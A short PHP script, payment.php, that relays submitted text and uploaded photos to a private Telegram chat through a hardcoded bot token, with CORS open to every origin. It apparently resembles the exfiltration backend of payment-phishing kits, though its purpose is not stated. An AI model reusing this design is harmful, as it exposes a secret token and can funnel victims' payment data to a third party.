<?php
// payment.php - Proxy ke Telegram (tidak pernah error)
header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");

$botToken = "8382250113:AAH1vrOjm04b8Vfjmg7yCkmPl8a7dvXvCqQ";
$chatId   = "7670525689";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Kirim Teks
    if (isset($_POST['caption'])) {
        $text = $_POST['caption'];
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $post = ['chat_id' => $chatId, 'text' => $text];
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        echo $res;
    }

    // Kirim Foto
    if (isset($_FILES['photo'])) {
        $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $post = ['chat_id' => $chatId];
        $file = new CURLFile($_FILES['photo']['tmp_name'], $_FILES['photo']['type'], $_FILES['photo']['name']);
        $post['photo'] = $file;
        if (isset($_POST['caption'])) $post['caption'] = $_POST['caption'];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($ch);
        curl_close($ch);
        echo $res;
    }
}
?>
